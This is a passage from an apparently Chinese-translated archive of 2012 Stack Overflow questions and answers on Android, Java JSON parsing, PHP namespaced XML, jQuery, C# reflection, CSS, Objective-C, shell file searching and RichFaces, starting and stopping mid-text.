在这种情况下，它是名为“ic_launcher”的基本绿色 android 图标。

到目前为止，我发现的唯一限制是用作 src 的可绘制文件必须是 .png 文件。它不能是 .xml 文件。

所以要清楚，“ic_launcher”实际上是一个名为“ic_launcher.png”的文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T23:03:18.577

您的 ScrollBar 拇指需要是 9patch png。既然你不想让它拉伸，你不需要在边缘添加任何黑线，只需在 Draw 9-patch 编辑器中弹出它并保存为 .9.png

# java - Java 解析 Json 字节数组

> ID：10403862
> 
> 赞同：0
> 
> 时间：2012-05-01T20:26:04.547
> 
> 标签：java, android, json, bytearray

我正在开发一个 Android 应用程序，它使用 Web 服务来获取将在应用程序中显示的图像。

我使用 JSON 作为我的格式。整个连接过程就像一个魅力，但我需要帮助来解析来自 web 服务请求的响应。

这是我的结果：

```
[255,12,87,183,232,34,64,121,182,23] 
```

当然这不是真实数据，我只是想解释一下我收到数据时的样子。所以我的问题是，我如何将这些数据解析为字节数组？

到目前为止，这是我的连接代码：

```
HttpResponse response = httpClient.execute(request);
HttpEntity responseEntity = response.getEntity();
InputStream stream = responseEntity.getContent();
String string_result= convertStreamToString(stream); 
```

这很好用，变量“string_result”包含接收到的数据。因此，如果有人知道如何简单地解析这个包含字节数组的 JSON 字符串，我将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:30:55.663

下面是解析这个数组以`byte[]`使用不可替代的[GSON 库](http://code.google.com/p/google-gson/)的示例：

```
String str = "[255,12,87,183,232,34,64,121,182,23]";
Gson gson = new Gson();
byte[] parsed = gson.fromJson(str, byte[].class);
for (byte b : parsed) {
    System.out.println(b);
} 
```

此代码输出：

```
-1
12
87
-73
-24
34
64
121
-74
23 
```

请注意，java`byte`已签名，因此您得到负数。

# php - 如何使用 PHP 遍历位于树中多个级别的命名空间 XML？

> ID：10403865
> 
> 赞同：0
> 
> 时间：2012-05-01T20:26:14.253
> 
> 标签：php, xml, iterator, simplexml

我尝试使用 foreach 循环遍历 SimpleXML 对象。我尝试使用 SimpleXMLIterator 获得相同的结果。

```
<?xml version="1.0" ?> 
```

```
<SectionResults 
    xmlns:ns10="http://wgs.thomsonreuters.com/clear/api/search/court-ucc-search-extension/niem/1.0" 
    xmlns:ns11="http://wgs.thomsonreuters.com/clear/api/search/court-search-extension/niem/1.0" 
    xmlns:ns12="http://wgs.thomsonreuters.com/clear/api/report/report-realProperty-extension/niem/1.0" 
    xmlns:ns13="http://wgs.thomsonreuters.com/clear/api/report/report-asset-extension/niem/1.0" 
    xmlns:ns14="http://wgs.thomsonreuters.com/clear/api/report/report-business-commerce-extension/niem/1.0" 
    xmlns:ns15="http://wgs.thomsonreuters.com/clear/api/search/sanction-search-extension/niem/1.0" 
    xmlns:ns16="http://wgs.thomsonreuters.com/clear/api/report/report-bankruptcy-extension/niem/1.0" 
    xmlns:ns17="http://wgs.thomsonreuters.com/clear/api/report/report-personaldata-extension/niem/1.0" 
    xmlns:ns18="http://wgs.thomsonreuters.com/clear/api/search/license-prolicense-search-extension/niem/1.0" 
    xmlns:ns19="http://wgs.thomsonreuters.com/clear/api/search/person-search-extension/niem/1.0" 
    xmlns:ns2="http://niem.gov/niem/structures/2.0" 
    xmlns:ns20="http://wgs.thomsonreuters.com/clear/api/search/business-search-extension/niem/1.0" 
    xmlns:ns21="http://wgs.thomsonreuters.com/clear/api/report/report-driver-vehicle-extension/niem/1.0" 
    xmlns:ns22="http://wgs.thomsonreuters.com/clear/api/report/report-fraud-extension/niem/1.0" 
    xmlns:ns23="http://wgs.thomsonreuters.com/clear/api/search/court-lawsuits-search-extension/niem/1.0" 
    xmlns:ns24="http://wgs.thomsonreuters.com/clear/api/report/report-lawsuit-extension/niem/1.0" 
    xmlns:ns25="http://wgs.thomsonreuters.com/clear/api/search/license-drivers-search-extension/niem/1.0" 
    xmlns:ns26="http://wgs.thomsonreuters.com/clear/api/report/report-lienjudge-extension/niem/1.0" 
    xmlns:ns27="http://wgs.thomsonreuters.com/clear/api/search/court-bankruptcy-search-extension/niem/1.0" 
    xmlns:ns28="http://wgs.thomsonreuters.com/clear/api/search/court-lienjudge-search-extension/niem/1.0" 
    xmlns:ns29="http://wgs.thomsonreuters.com/clear/api/report/report-docket-extension/niem/1.0" 
    xmlns:ns3="http://niem.gov/niem/niem-core/2.0" 
    xmlns:ns30="http://wgs.thomsonreuters.com/clear/api/report/report-sanction-extension/niem/1.0" 
    xmlns:ns31="http://wgs.thomsonreuters.com/clear/api/report/report-license-extension/niem/1.0" 
    xmlns:ns32="http://wgs.thomsonreuters.com/clear/api/search/npi-search-extension/niem/1.0" 
    xmlns:ns33="http://wgs.thomsonreuters.com/clear/api/search/court-criminal-search-extension/niem/1.0" 
    xmlns:ns34="http://wgs.thomsonreuters.com/clear/api/report/report-npi-extension/niem/1.0" 
    xmlns:ns35="http://niem.gov/niem/appinfo/2.0" 
    xmlns:ns36="http://wgs.thomsonreuters.com/clear/api/report/1.0" 
    xmlns:ns37="http://wgs.thomsonreuters.com/clear/api/report/person-report/niem/1.0" 
    xmlns:ns38="http://wgs.thomsonreuters.com/clear/api/report/report-asset/niem/1.0" 
    xmlns:ns39="http://wgs.thomsonreuters.com/clear/api/report/report-bankruptcy/niem/1.0" 
    xmlns:ns4="http://wgs.thomsonreuters.com/clear/api/search/license-search-extension/niem/1.0" 
    xmlns:ns40="http://wgs.thomsonreuters.com/clear/api/report/report-business-commerce/niem/1.0" 
    xmlns:ns41="http://wgs.thomsonreuters.com/clear/api/report/report-crime/niem/1.0" 
    xmlns:ns42="http://wgs.thomsonreuters.com/clear/api/report/report-docket/niem/1.0" 
    xmlns:ns43="http://wgs.thomsonreuters.com/clear/api/report/report-driver-vehicle/niem/1.0" 
    xmlns:ns44="http://wgs.thomsonreuters.com/clear/api/report/report-fraud/niem/1.0" 
    xmlns:ns45="http://wgs.thomsonreuters.com/clear/api/report/report-lawsuit/niem/1.0" 
    xmlns:ns46="http://wgs.thomsonreuters.com/clear/api/report/report-license/niem/1.0" 
    xmlns:ns47="http://wgs.thomsonreuters.com/clear/api/report/report-lienjudge/niem/1.0" 
    xmlns:ns48="http://wgs.thomsonreuters.com/clear/api/report/report-personaldata/niem/1.0" 
    xmlns:ns49="http://wgs.thomsonreuters.com/clear/api/report/report-realProperty/niem/1.0" 
    xmlns:ns5="http://wgs.thomsonreuters.com/clear/api/search/license-search/niem/1.0" 
    xmlns:ns50="http://wgs.thomsonreuters.com/clear/api/search/person-search/niem/1.0" 
    xmlns:ns51="http://wgs.thomsonreuters.com/clear/api/search/phone-search/niem/1.0"
    xmlns:ns52="http://wgs.thomsonreuters.com/clear/api/search/business-search/niem/1.0" 
    xmlns:ns6="http://wgs.thomsonreuters.com/clear/api/report/report-crime-extension/niem/1.0"
    xmlns:ns7="http://wgs.thomsonreuters.com/clear/api/report/person-report-extension/niem/1.0" 
    xmlns:ns8="http://wgs.thomsonreuters.com/clear/api/search/phone-search-extension/niem/1.0" 
    xmlns:ns9="http://wgs.thomsonreuters.com/clear/api/search/court-search/niem/1.0">

    <SectionDetails>

        <ns37:UserSuppliedSection>

            <ns7:Address>

                <ns3:LocationCityName>
                    GREENBAY
                </ns3:LocationCityName>

                <ns3:LocationPostalCode>
                    54311
                </ns3:LocationPostalCode>

                <ns3:LocationStateUSPostalServiceCode>
                    WI
                </ns3:LocationStateUSPostalServiceCode>

                <ns3:StreetFullText>
                    123 Main St. 
                </ns3:StreetFullText>

            </ns7:Address>

            <ns7:PersonInfo>

                <ns3:PersonBirthDate>

                    <ns3:Date>
                        1982-08-12
                    </ns3:Date>

                </ns3:PersonBirthDate>

                <ns3:PersonName>

                    <ns3:PersonGivenName>
                        JOHN
                    </ns3:PersonGivenName>

                    <ns3:PersonMiddleName>
                        J
                    </ns3:PersonMiddleName>

                    <ns3:PersonSurName>
                        DOE
                    </ns3:PersonSurName>

                </ns3:PersonName>

                <ns3:PersonSSNIdentification>

                    <ns3:IdentificationID>
                        123456789
                    </ns3:IdentificationID>

                </ns3:PersonSSNIdentification>

            </ns7:PersonInfo>

        </ns37:UserSuppliedSection>

    </SectionDetails>
</SectionResults>

<SectionResults xmlns:ns10="http://wgs.thomsonreuters.com/clear/api/search/court-ucc-search-extension/niem/1.0" xmlns:ns11="http://wgs.thomsonreuters.com/clear/api/search/court-search-extension/niem/1.0" xmlns:ns12="http://wgs.thomsonreuters.com/clear/api/report/report-realProperty-extension/niem/1.0" xmlns:ns13="http://wgs.thomsonreuters.com/clear/api/report/report-asset-extension/niem/1.0" xmlns:ns14="http://wgs.thomsonreuters.com/clear/api/report/report-business-commerce-extension/niem/1.0" xmlns:ns15="http://wgs.thomsonreuters.com/clear/api/search/sanction-search-extension/niem/1.0" xmlns:ns16="http://wgs.thomsonreuters.com/clear/api/report/report-bankruptcy-extension/niem/1.0" xmlns:ns17="http://wgs.thomsonreuters.com/clear/api/report/report-personaldata-extension/niem/1.0" xmlns:ns18="http://wgs.thomsonreuters.com/clear/api/search/license-prolicense-search-extension/niem/1.0" xmlns:ns19="http://wgs.thomsonreuters.com/clear/api/search/person-search-extension/niem/1.0" xmlns:ns2="http://niem.gov/niem/structures/2.0" xmlns:ns20="http://wgs.thomsonreuters.com/clear/api/search/business-search-extension/niem/1.0" xmlns:ns21="http://wgs.thomsonreuters.com/clear/api/report/report-driver-vehicle-extension/niem/1.0" xmlns:ns22="http://wgs.thomsonreuters.com/clear/api/report/report-fraud-extension/niem/1.0" xmlns:ns23="http://wgs.thomsonreuters.com/clear/api/search/court-lawsuits-search-extension/niem/1.0" xmlns:ns24="http://wgs.thomsonreuters.com/clear/api/report/report-lawsuit-extension/niem/1.0" xmlns:ns25="http://wgs.thomsonreuters.com/clear/api/search/license-drivers-search-extension/niem/1.0" xmlns:ns26="http://wgs.thomsonreuters.com/clear/api/report/report-lienjudge-extension/niem/1.0" xmlns:ns27="http://wgs.thomsonreuters.com/clear/api/search/court-bankruptcy-search-extension/niem/1.0" xmlns:ns28="http://wgs.thomsonreuters.com/clear/api/search/court-lienjudge-search-extension/niem/1.0" xmlns:ns29="http://wgs.thomsonreuters.com/clear/api/report/report-docket-extension/niem/1.0" xmlns:ns3="http://niem.gov/niem/niem-core/2.0" xmlns:ns30="http://wgs.thomsonreuters.com/clear/api/report/report-sanction-extension/niem/1.0" xmlns:ns31="http://wgs.thomsonreuters.com/clear/api/report/report-license-extension/niem/1.0" xmlns:ns32="http://wgs.thomsonreuters.com/clear/api/search/npi-search-extension/niem/1.0" xmlns:ns33="http://wgs.thomsonreuters.com/clear/api/search/court-criminal-search-extension/niem/1.0" xmlns:ns34="http://wgs.thomsonreuters.com/clear/api/report/report-npi-extension/niem/1.0" xmlns:ns35="http://niem.gov/niem/appinfo/2.0" xmlns:ns36="http://wgs.thomsonreuters.com/clear/api/report/1.0" xmlns:ns37="http://wgs.thomsonreuters.com/clear/api/report/person-report/niem/1.0" xmlns:ns38="http://wgs.thomsonreuters.com/clear/api/report/report-asset/niem/1.0" xmlns:ns39="http://wgs.thomsonreuters.com/clear/api/report/report-bankruptcy/niem/1.0" xmlns:ns4="http://wgs.thomsonreuters.com/clear/api/search/license-search-extension/niem/1.0" xmlns:ns40="http://wgs.thomsonreuters.com/clear/api/report/report-business-commerce/niem/1.0" xmlns:ns41="http://wgs.thomsonreuters.com/clear/api/report/report-crime/niem/1.0" xmlns:ns42="http://wgs.thomsonreuters.com/clear/api/report/report-docket/niem/1.0" xmlns:ns43="http://wgs.thomsonreuters.com/clear/api/report/report-driver-vehicle/niem/1.0" xmlns:ns44="http://wgs.thomsonreuters.com/clear/api/report/report-fraud/niem/1.0" xmlns:ns45="http://wgs.thomsonreuters.com/clear/api/report/report-lawsuit/niem/1.0" xmlns:ns46="http://wgs.thomsonreuters.com/clear/api/report/report-license/niem/1.0" xmlns:ns47="http://wgs.thomsonreuters.com/clear/api/report/report-lienjudge/niem/1.0" xmlns:ns48="http://wgs.thomsonreuters.com/clear/api/report/report-personaldata/niem/1.0" xmlns:ns49="http://wgs.thomsonreuters.com/clear/api/report/report-realProperty/niem/1.0" xmlns:ns5="http://wgs.thomsonreuters.com/clear/api/search/license-search/niem/1.0" xmlns:ns50="http://wgs.thomsonreuters.com/clear/api/search/person-search/niem/1.0" xmlns:ns51="http://wgs.thomsonreuters.com/clear/api/search/phone-search/niem/1.0" xmlns:ns52="http://wgs.thomsonreuters.com/clear/api/search/business-search/niem/1.0" xmlns:ns6="http://wgs.thomsonreuters.com/clear/api/report/report-crime-extension/niem/1.0" xmlns:ns7="http://wgs.thomsonreuters.com/clear/api/report/person-report-extension/niem/1.0" xmlns:ns8="http://wgs.thomsonreuters.com/clear/api/search/phone-search-extension/niem/1.0" xmlns:ns9="http://wgs.thomsonreuters.com/clear/api/search/court-search/niem/1.0">
    <SectionName>
        SubjectSection
    </SectionName>
    <SectionStatus>
        COMPLETE
    </SectionStatus>
    <SectionRecordCount>
        1
    </SectionRecordCount>
    <SectionDetails>
        <ns37:SubjectSection>
            <ns7:PersonInfo>
                <ns7:SSNIssuanceText>
                    SSN issued in WI in 1981
                </ns7:SSNIssuanceText>
                <ns7:SSNStartYear>
                    1981
                </ns7:SSNStartYear>
                <ns3:PersonAgeDescriptionText>
                    50
                </ns3:PersonAgeDescriptionText>
                <ns3:PersonBirthDate>
                    <ns3:Date>
                        1900-01-12
                    </ns3:Date>
                </ns3:PersonBirthDate>
                <ns3:PersonName>
                    <ns3:PersonGivenName>
                        JOHN
                    </ns3:PersonGivenName>
                    <ns3:PersonMiddleName>
                        J
                    </ns3:PersonMiddleName>
                    <ns3:PersonSurName>
                        DOE
                    </ns3:PersonSurName>
                </ns3:PersonName>
                <ns3:PersonSSNIdentification>
                    <ns3:IdentificationID>
                        123-45-6789
                    </ns3:IdentificationID>
                    <ns3:IdentificationJurisdictionText>
                        CA
                    </ns3:IdentificationJurisdictionText>
                </ns3:PersonSSNIdentification>
            </ns7:PersonInfo>
        </ns37:SubjectSection>
    </SectionDetails>
</SectionResults> 
```

如果我需要使用它们，所有命名空间都在 SectionResults 节点中定义。XML 的 var_dump 可以很好地返回 SectionName、SectionStatus 和 SectionRecordCount。但是，SectionDetails 作为另一个 SimpleXML 对象返回。我试过循环 $xml->SectionDetails->children('namespace')，但我无法获取任何信息。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T09:18:28.380

对于这样的多个命名空间，使用`SimpleXML::children()`并​​不是最佳的。`xpath`查询会更好地为您服务。例子：

```
$path = '/SectionResults/SectionDetails/ns37:UserSuppliedSection/ns7:Address/*';
foreach ($xml->xpath($path) as $e) {
    echo $e->getName() , ': ', trim($e);
    echo "\n";
} 
```

# javascript - .is(":animated") 选择器在动画期间返回 true 并被调用两次

> ID：10403866
> 
> 赞同：1
> 
> 时间：2012-05-01T20:26:16.423
> 
> 标签：javascript, jquery, jquery-animate

我在 jquery`:animated`选择器中遇到问题，我使用 jquery`animate`函数中的回调函数在动画完成后调用 ajax 页面，但问题是：通过 ajax 调用页面被调用两次！

```
$('#elemId').click(function(){
$('html,body').animate({scrollTop: $('#sections_display').offset().top-100}, 500, function(){
        $('#sections_display').load('page.php');
});
}); 
```

结果“page.php 被加载了两次！在 firebug 中”。

所以我尝试了：

```
$('#elemId').click(function(){
       $('html,body').animate({scrollTop: $('#sections_display').offset().top-100}, 500);
});

if ($('html,body').is(":animated")) {
     $('#sections_display').load('page.php');
} 
```

问题`if ($('html,body').is(":animated"))`总是`true`在页面动画期间返回，但我想在动画完成后返回 true。

我也试过：

```
$('#elemId').click(function(){
$('html,body').animate({scrollTop: $('#sections_display').offset().top-100}, 500, function(){
    if ($(this).is(":animated")) {
        $('#sections_display').load('page.php');
    }
});
}); 
```

结果“page.php 被加载了两次”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:28:49.247

> 结果“page.php 被加载了两次！在 firebug 中”。

那是因为您将事件附加到`html`和`body`。尝试一下`html`：

```
$('#elemId').click(function(){
    $('html').animate({scrollTop: $('#sections_display').offset().top-100}, 500, function(){
            $('#sections_display').load('page.php');
    });
}); 
```

# c# - 使用反射获取静态属性值，派生类和基类的串联

> ID：10403868
> 
> 赞同：3
> 
> 时间：2012-05-01T20:26:19.213
> 
> 标签：c#, reflection

我将尽我所能在这里解释我的愿景。这是一个非常蹩脚的虚构例子。我有几种不同类型的`Bag`s，它们都有自己特殊类型的`Marble`. 每种类型`Marble`都有自己的一组昵称 ( `string`s)。

不幸的是，除了 Marble in the Bag 之外还有其他东西，所以泛型在这里帮不了我。

```
// Bags
abstract class Bag {
    protected Type MarbleType { get; }
    protected List<Marble> _marbles;

    public void DumpBag()
    { ... }
}
class RedBag : Bag {
    override Type MarbleType { get { return typeof(RedMarble); } }
}
class BlueBag : Bag {
    override Type MarbleType { get { return typeof(BlueMarble); } }
}

// Marbles
abstract class Marble {
    public static IEnumerable<string> Nicknames {
        get {
            return new List<string>() {
               "Marble", "RollyThing"
            }
        }
    }
}
class RedMarble : Marble {
    public static IEnumerable<string> Nicknames {
        get {
            return new List<string>(Marble.Nicknames) {
                "Ruby"
            };
        }
    }
}
class BlueMarble : Marble { ... } 
```

所以现在我们来看看细节，实现`DumpBag()`。考虑以下调用：

```
Bag b = new RedBag();
b.GetMarbles();
b.DumpBag(); 
```

我希望它打印：

```
Bag of Marbles (aka "Marble", "RollyThing", Ruby"):
- Marble 1
- Marble 2
... 
```

我们看到，为了打印该标题，`Bag`必须能够了解 的派生类型`Marble`，而与任何实际实例无关。它得到基类的串联`Nicknames`，`Marble`但也得到派生的`RedMarble`。

`DumpBag`需要做一种“静态虚拟调用”。我已经开始实施`DumpBag`以下内容：

```
public void DumpBag() {
    PropertyInfo pi = this.MarbleType.GetProperty("Nicknames", BindingFlags.Static);
    IEnumerable<string> nicknames = pi.GetValue(null, null);  // No instance

    StringBuilder sb = new StringBuilder("Bag of Marbles (aka ");
    foreach (string nn in nicknames)
        sb.Append("\"" + nn + "\", ");
    Console.WriteLine(sb.ToString());

    ...
} 
```

我的问题：

1.  这是理智的吗？希望我已经（或者我可以）解释我为什么走这条路的理由。
2.  我收到一个`RedMarble.Nicknames`隐藏的警告（当然） `Marble.Nicknames`。继续标记它似乎有效`new`吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:43:16.387

你会发现你所缺少的只是一个*明确*的演员表：

`(List<string>)this.MarbleType.GetProperty("Nicknames").GetValue(null, null);`

当我测试它时，这对我来说很好。

正如评论中所讨论的那样，不，您不应该真正使用 new 关键字，最好将基类静态方法命名为其他名称，这样就不会产生歧义。毕竟你可以控制它，而不是使用别人的代码。

* * *

现在，你**应该**这样做吗？

好吧，首先肯定你想使用泛型而不是定义的方法来返回类型：

```
abstract class Bag<T> where T:marble {
    public void DumpBag()
    { 
        // here you can use
        // (IEnumerable<string>)typeof(T).GetProperty("Nicknames").GetValue(null, null);
    }
}

class RedBag : Bag<RedMarble> {
}

class BlueBag : Bag<BlueMarble> {
} 
```

当然，您可以做的第二件事是使它*不是 static*，在这种情况下，属性将是抽象的，并在and中`Marble`被覆盖，然后直接访问 in而不是使用反射。`RedMarble``BlueMarble``DumpBag``Nicknames`

# javascript - Firefox javascript转义错误

> ID：10403871
> 
> 赞同：1
> 
> 时间：2012-05-01T20:26:33.250
> 
> 标签：javascript, character-encoding, escaping

我的页面上有一个表单，它在提交时运行 javascript 函数。此功能打开一个新窗口`window.open(uri,…)`

由于这是德语形式，因此有变音符号和其他字符，如 ß、ä、ö、ü。

所以我将输入的值传递`escape(input.value)`给我的 uri 变量。

在 Chrome 中，这工作得很好，传递的 url 看起来像这样

```
index.php?PLZ=&Ort=Ha%DFloch 
```

但是当我在 Firefox 中打开该站点时，它看起来像这样：

```
index.php?PLZ=&Ort=Ha�loch 
```

那么如何在两种浏览器中获得正确的结果呢？

我尝试了几乎所有东西，从 encodeURI 到 encodeURIcomponent 等等……</p>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-15T19:54:26.493

使用表格将字符编码设置为 UTF-8：

```
<form accept-charset="utf-8"> 
```

并将其设置在头部：

```
<head>
 <meta charset="utf-8">
</head> 
```

# c# - 如何在 MongoDB 中表示此模式

> ID：10403873
> 
> 赞同：1
> 
> 时间：2012-05-01T20:26:47.187
> 
> 标签：c#, database-design, mongodb

在我目前正在开发的应用程序中，我们有以下内容：

*   客户
*   引号
*   报价行项目（与报价相关联）

现在我知道很容易说没有客户就不能存在报价，因此它们应该存在于客户文档中，但我正在考虑我最有可能进行的查询。

我希望能够获得某种状态的所有报价，而与客户无关（但有客户的详细信息）

我不确定客户和报价应该是单独的集合还是应该所有内容都存在于客户集合中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:29:27.833

就个人而言，我会把它们分开。正如您所提到的，最重要的考虑因素是查询模式。听起来您将与客户分开处理报价。如果有的话，我会将所有行项目放在同一个报价文件中。但是从您提供的少量信息来看，将客户和报价分开似乎是有道理的。

# windows-7 - 使 Windows 7 资源管理器详细信息分隔线更宽？

> ID：10403874
> 
> 赞同：1
> 
> 时间：2012-05-01T20:26:49.603
> 
> 标签：windows-7, explorer

是否可以在 Win 7 Explorer 中加宽 Details 视图列标题之间的可拖动分隔线？我指的是带有“名称”、“修改日期”、“类型”、“大小”等的列标题。它们之间的分隔线非常好，以至于我经常最终拖动列而不是调整列的大小。

# css - 如何通过 CSS（不显示）摆脱自动生成的跨度？

> ID：10403875
> 
> 赞同：0
> 
> 时间：2012-05-01T20:26:50.223
> 
> 标签：css, html

我正在使用 Drupal`ShareThis`模块。不幸的是，该模块的最新安全版本`span`在生成的代码中添加了一个，它破坏了我的页面专业布局。之前一切正常。

没有选项可以控制此代码的生成：

```
<span class="chicklets twitter">&nbsp;</span> 
```

是否可以通过 CSS 删除/不显示此跨度代码？如果是怎么办？

我试过了：

```
.chicklets twitter {
    display:none;
} 
```

但没有成功。我不是 CSS 专家。谢谢。

**更新**

这是 FireBug 的屏幕截图：

![在此处输入图像描述](../Images/254f7b80b38384e21ad8515825d35689.png)

我一直在尝试建议的解决方案：

```
span.chicklets {
    display:none;
} 
```

以上完全删除了所有 ShareThis 按钮（可以通过以下问题来解释）：

```
span.chicklets.twitter {
    display:none;
} 
```

上面删除了按钮，但相应的跨度仍然在 FireBug 中显示为阴影（见下）。

![在此处输入图像描述](../Images/48ac23349b76842ee045404fb7b4309f.png)

当然，我需要保留我的按钮。什么可能导致这种情况？

PS：没关系，如有必要，我将在另一个问题中讨论这个额外的问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:29:24.877

`chicklets`并且`twitter`是 2 个单独的类。您只需要设置`display:none`其中之一。

```
span.chicklets {
    display:none;
} 
```

我已将此限制为仅跨越带有 class 的元素`chicklets`。请注意，这可能会影响也具有`chicklets`该类的其他 span 元素

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T20:35:03.853

如果要专门设置具有两个类的元素的样式，请将它们组合在一起，不要有空格。点表示法的意思是“类”，所以你可以在它们之前放一个点并将它们连接起来：

```
span.chicklets.twitter {
    display: none;
} 
```

正如@AndrewBrock 建议的那样，您也可以只使用其中一个类，只要您知道单个类不会以不良方式影响其他 span 元素。

如果您需要 span 来维护按钮，但不希望 span 占用空间，则将其更改为：

```
span.chicklets.twitter {
    width: 0px;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:36:18.253

如果你有 jQuery 运行，它会这样做（删除它而不是隐藏它）：

```
$(".chicklets.twitter").remove(); 
```

# nsmutablearray - 附加 NSMutableStrings - 应为“。” 前 ”。” 令牌错误

> ID：10403876
> 
> 赞同：0
> 
> 时间：2012-05-01T20:26:58.993
> 
> 标签：nsmutablearray, append, nsmutablestring, inheritance

我不确定我做错了什么。我在想它是因为 NSMutableArray 的 *name 和 *field 是在不同的文件中声明的。

```
#import <Foundation/Foundation.h>

@interface xmlToUrl : NSObject {    

    NSString *base_url;
    NSMutableArray *field;
    NSMutableArray *name;
}
@property(nonatomic,retain)NSString *base_url;
@property(nonatomic, retain)NSMutableArray *field;
@property(nonatomic, retain)NSMutableArray *name;

@end 
```

和

```
#import "xmlToUrl.h"

@implementation xmlToUrl
@synthesize base_url;
@synthesize field;
@synthesize name;

-(id) init
{
    self = [super init];
    if (self) {
        field = [[NSMutableArray alloc] init];
        name = [[NSMutableArray alloc] init];
    }
    return self;
}

-(void)dealloc
{
    [base_url release];
    [field release];
    [name release];
    [super dealloc];
}

@end 
```

NSMutableArrays 填充在 ViewController 类中：

```
//nodeContent is just a NSMutableString being added to the *name and *field NSMutableArrays

if([ending isEqualToString:@"name"]){
        if(![nodeContent isEqualToString:@""])
        {[xmlToUrlObject.name addObject:nodeContent];}
    }
    else if([ending isEqualToString:@"field"]){
        if(![nodeContent isEqualToString:@""])
        {[xmlToUrlObject.field addObject:nodeContent];} 
```

错误 = 预期的“。” 前 '。' 令牌。（在下面代码的第一行）

我想要的输出： *url 字符串包含按顺序连接的 base_url、urlPart2 和 urlPart3。

前任：

base_url = @"www."

urlPart2 = @"我的网站"

urlPart3 = @".com"

网址 = @“www.mywebsite.com”

```
//xmlToUrl is an instance of its own class (.m file)  It contains the *name and *field NSMutableArray
//xmlToUrl.h is inherited in this file

NSMutableString *urlPart2 = [xmlToUrl.name objectAtIndex: 0];
    [xmlToUrl.name removeObjectAtIndex:0];
    NSMutableString *url = [xmlToUrl.base_url stringByAppendingString:urlPart2];

    if([xmlToUrl.field count] != 0)
    {NSMutableString *urlPart3 = [xmlToUrl.field objectAtIndex: 0];
    [xmlToUrl.field removeObjectAtIndex:0}
    url = [url stringByAppendingString:urlPart3];

     [urlPart2 release];
     [urlPart3 release]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:55:05.740

您正在尝试访问类上的属性，而不是实例上的属性：

```
@interface xmlToUrl : NSObject { 
```

和

```
NSMutableString *urlPart2 = [xmlToUrl.name objectAtIndex: 0]; 
```

您只能访问 xmlToUrl 实例上的属性，就像您在以下代码行中所做的那样：

```
{[xmlToUrlObject.name addObject:nodeContent];} 
```

在这里，xmlToUrlObject 是一个实例，而不是类。

# jquery - 什么 jquery 库用于下面标签中的输入文本关键字按钮？

> ID：10403885
> 
> 赞同：0
> 
> 时间：2012-05-01T20:27:19.270
> 
> 标签：jquery

我不知道如何更好地描述它，但我试图弄清楚正在使用哪个库来在下面输入标签以生成带有单击侦听器的单个关键字按钮，单击侦听器会在单击时删除按钮。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:35:26.453

它不一样，但[这个插件](http://levycarneiro.com/projects/tag-it/example.html)具有非常相似的功能。来源在[这里](http://levycarneiro.com/projects/tag-it/js/)

仅供参考，此类控件的术语是“自动完成标签”。

# linux - 我正在尝试在 shell 脚本中查找具有多个扩展名的文件

> ID：10403886
> 
> 赞同：7
> 
> 时间：2012-05-01T20:27:19.833
> 
> 标签：linux, shell

这是我到目前为止所拥有的

```
DIR="/home/username/Pictures/Wallpapers"

while [ 1 -eq 1 ]
do
    PIC=$(ls $DIR/*.jpg | shuf -n1)
    PIC1="file://"$PIC

    gsettings set org.gnome.desktop.background picture-uri $PIC1
    sleep 30;
done 
```

该脚本有效，但我不知道如何扩展它以查找其他文件扩展名，例如除 jpg 之外的 png 或 gif。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-01T20:34:00.160

使用 find 怎么样？

```
find $DIR -name \*.jpg -o -name \*.png -o -name \*.gif -print 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-01T20:40:50.880

假设 bash，最简单的*改变*是

```
PIC=$(ls $DIR/*.{jpg,png,gif} | shuf -n1) 
```

这是我机器上的示例

```
$ export DIR=Desktop
$ PIC=$(ls $DIR/*.{jpg,png,gif} | shuf -n1)
$ echo $PIC

Desktop/polar.png 
```

我建议使用 find 来代替。

# jsf-2 - Richfaces未定义javascript错误

> ID：10403889
> 
> 赞同：5
> 
> 时间：2012-05-01T20:27:27.680
> 
> 标签：jsf-2, richfaces, facelets

当我尝试调用 Richfaces.showModalPanel('id') 时，我得到 Richfaces is not defined javascript 错误并且没有任何反应。

在我的示例应用程序中，我有两个页面，一个是主视图，另一个页面是子视图。子视图使用上述调用在主视图中调用 popupPanel。我不确定出了什么问题。任何指针将不胜感激。

这是我拥有的页面：

**第一页：**

```
<!DOCTYPE html>
<html lang="en"
      xmlns="http://www.w3.org/1999/xhtml"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:rich="http://richfaces.org/rich"
      xmlns:c="http://java.sun.com/jsp/jstl/core"
      xmlns:richext="http://java.sun.com/jsf/composite/richext">
    <h:head>
        <title>Page Title</title>

    </h:head>
    <h:body>

     <ui:include id="nextPageInclude" src="secondpage.xhtml"/>   
    <rich:popupPanel id="logoutDialogId"
                 width="300"
                 height="50"
                 autosized="true"
                 resizeable="false"
                 moveable="true"
                 modal="true"
                 style="border:5px solid #5e81ac; background-color:#dce3ed;">

        <h:outputText value="Inside logout window"/>
    </rich:popupPanel>

    </h:body>
</html> 
```

**第二页：**

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:a4j="http://richfaces.org/a4j"
    xmlns:rich="http://richfaces.org/rich">
    <h:head/>
    <a4j:outputPanel id='headerLinks' layout="block">
        <ul id="sddm">
            <li>
            </li>
            <li>
            </li>
            <li>
